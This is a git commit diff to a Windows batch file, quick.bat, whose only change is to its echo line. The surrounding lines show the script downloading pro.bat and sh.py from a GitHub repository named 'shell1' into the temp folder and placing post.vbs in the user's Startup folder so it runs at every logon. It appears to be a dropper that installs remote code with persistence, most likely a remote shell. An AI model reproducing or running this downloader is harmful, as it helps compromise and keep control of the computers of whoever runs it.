ed12ea28f5f81289718124af10778d474432a9c5
Omar Samy <osamy7592@gmail.com>
2024-05-04 03:09:14 +0300

    Update quick.bat

--- quick.bat
+++ quick.bat
@@ -1,4 +1,4 @@
-#echo off
+@echo off
 curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/pro.bat -o %temp%\pro.bat
 curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/sh.py -o %temp%\sh.py
 curl https://raw.githubusercontent.com/omarsamyX0/shell1/main/post.vbs -o "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\post.vbs"
